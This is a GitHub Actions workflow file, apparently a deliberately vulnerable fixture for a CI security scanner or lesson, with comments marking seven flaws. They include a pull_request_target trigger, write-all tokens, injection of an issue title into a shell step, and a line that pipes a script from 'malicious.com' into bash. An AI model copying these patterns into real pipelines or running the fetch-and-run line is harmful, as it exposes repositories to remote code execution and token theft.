name: "Vulnerable CI/CD Pipeline"

# VULNERABILITY 5: Dangerous Trigger
on: [pull_request_target]

# VULNERABILITY 3: Overly Permissive Global Tokens
permissions: write-all

jobs:
  build:
    # VULNERABILITY 6: Missing timeout-minutes (can run for 6 hours!)
    
    # VULNERABILITY 3b: Dangerous Job-level Permissions
    permissions:
      contents: write
      packages: write
      
    runs-on: ubuntu-latest
    steps:
      # VULNERABILITY 1: Unpinned Dependency
      - name: Checkout code
        uses: actions/checkout@v3
        
      # VULNERABILITY 2: Command Injection
      - name: Print Issue Title
        run: |
          echo "Processing issue: ${{ github.event.issue.title }}"
          
      # VULNERABILITY 4: Remote Code Execution (Curl to Bash)
      - name: Install Tool
        run: |
          curl -sL https://malicious.com/install.sh | bash
          
      # VULNERABILITY 7: Deprecated set-env command
      - name: Set Environment Variable
        run: |
          echo "::set-env name=MY_VAR::my_value"

      # SECURE EXAMPLE: Pinned by hash
